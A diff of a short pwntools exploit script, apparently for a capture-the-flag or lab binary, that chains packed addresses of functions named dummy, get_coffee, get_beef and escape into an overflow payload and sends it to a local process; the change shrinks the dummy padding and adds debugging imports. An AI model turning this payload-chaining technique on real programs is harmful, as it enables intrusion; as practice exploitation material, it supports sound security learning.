@@ -1,5 +1,5 @@
 import sys
-from pwn import process, context, p64, ELF
+from pwn import process, context, p64, ELF, gdb, raw_input,pause
 import time
 import re
 
@@ -19,14 +19,11 @@ dummy = context.binary.symbols['dummy']
 get_beef = context.binary.symbols['get_beef']
 get_coffee = context.binary.symbols['get_coffee']
 escape = context.binary.symbols['escape']
-input = p64(dummy)
-for i in range(100):
-    input += p64(dummy)
+input = p64(dummy) * 10
 input += p64(get_coffee)
 input += p64(get_beef)
 input += p64(escape)
 ####################################################
-
 # Send input to program
 io.sendline(input)
 
